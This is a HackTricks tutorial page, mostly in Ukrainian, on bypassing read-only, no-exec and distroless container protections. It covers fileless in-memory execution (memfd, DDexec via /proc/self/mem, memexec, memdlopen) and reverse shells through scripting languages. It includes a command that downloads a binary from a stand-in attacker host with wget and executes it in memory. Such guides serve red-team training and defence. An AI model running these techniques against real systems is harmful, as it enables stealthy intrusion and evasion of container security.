# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## read-only / no-exec scenario

Все частіше можна зустріти linux-машини, змонтовані з **захистом файлової системи тільки для читання (ro)**, особливо в контейнерах. Це пов'язано з тим, що запустити контейнер з файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** в `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак, навіть якщо файлова система змонтована як ro, **`/dev/shm`** все ще буде доступна для запису, тому це неправда, що ми не можемо нічого записати на диск. Проте, ця папка буде **змонтована з захистом no-exec**, тому якщо ви завантажите бінарний файл сюди, ви **не зможете його виконати**.

{% hint style="warning" %}
З точки зору червоної команди, це ускладнює **завантаження та виконання** бінарних файлів, які вже не знаходяться в системі (як бекдори або енумератори, такі як `kubectl`).
{% endhint %}

## Easiest bypass: Scripts

Зверніть увагу, що я згадував бінарні файли, ви можете **виконувати будь-який скрипт**, якщо інтерпретатор знаходиться всередині машини, наприклад, **shell-скрипт**, якщо `sh` присутній, або **python** **скрипт**, якщо встановлений `python`.

Однак цього недостатньо, щоб виконати ваш бінарний бекдор або інші бінарні інструменти, які вам можуть знадобитися.

## Memory Bypasses

Якщо ви хочете виконати бінарний файл, але файлова система цього не дозволяє, найкращий спосіб зробити це - **виконати його з пам'яті**, оскільки **захисти не застосовуються там**.

### FD + exec syscall bypass

Якщо у вас є потужні скриптові движки всередині машини, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити бінарний файл для виконання з пам'яті, зберегти його в файловому дескрипторі пам'яті (`create_memfd` syscall), який не буде захищений цими захистами, а потім викликати **`exec` syscall**, вказуючи **fd як файл для виконання**.

Для цього ви можете легко використовувати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому бінарний файл, і він згенерує скрипт у вказаній мові з **бінарним файлом, стиснутим і закодованим в b64** з інструкціями для **декодування та розпакування** його в **fd**, створеному за допомогою виклику `create_memfd` syscall, і викликом **exec** syscall для його виконання.

{% hint style="warning" %}
Це не працює в інших скриптових мовах, таких як PHP або Node, оскільки у них немає жодного **за замовчуванням способу викликати сирі системні виклики** з скрипту, тому неможливо викликати `create_memfd`, щоб створити **memory fd** для зберігання бінарного файлу.

Більше того, створення **звичайного fd** з файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його виконати через те, що **захист no-exec** буде застосований.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) - це техніка, яка дозволяє вам **модифікувати пам'ять вашого власного процесу** шляхом перезапису його **`/proc/self/mem`**.

Отже, **контролюючи асемблерний код**, який виконується процесом, ви можете написати **shellcode** і "мутувати" процес, щоб **виконати будь-який довільний код**.

{% hint style="success" %}
**DDexec / EverythingExec** дозволить вам завантажити та **виконати** ваш власний **shellcode** або **будь-який бінарний файл** з **пам'яті**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Для отримання додаткової інформації про цю техніку перевірте Github або:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec за допомогою техніки DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.

Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP реверс-шелу** за адресою [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

З подібною метою до DDexec, техніка [**memdlopen**](https://github.com/arget13/memdlopen) дозволяє **легше завантажувати бінарні файли** в пам'ять для подальшого виконання. Це може навіть дозволити завантажувати бінарні файли з залежностями.

## Distroless Bypass

### Що таке distroless

Контейнери distroless містять лише **найнеобхідні компоненти для запуску конкретного застосунку або служби**, такі як бібліотеки та залежності виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або системні утиліти.

Мета контейнерів distroless полягає в тому, щоб **зменшити поверхню атаки контейнерів, усунувши непотрібні компоненти** та мінімізуючи кількість вразливостей, які можуть бути використані.

### Реверс-шел

У контейнері distroless ви, можливо, **навіть не знайдете `sh` або `bash`**, щоб отримати звичайну оболонку. Ви також не знайдете бінарні файли, такі як `ls`, `whoami`, `id`... все, що ви зазвичай запускаєте в системі.

{% hint style="warning" %}
Отже, ви **не зможете** отримати **реверс-шел** або **перерахувати** систему, як зазвичай.
{% endhint %}

Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-яких **скриптових мов**.

{% hint style="success" %}
Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.
{% endhint %}

Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записувати у файлову систему свої бінарні файли** та **виконувати** їх.

{% hint style="success" %}
Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.
{% endhint %}

Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE** для отримання реверс-шелів скриптових мов та виконання бінарних файлів з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Якщо вас цікавить **кар'єра в хакінгу** і ви хочете зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримка HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, подаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
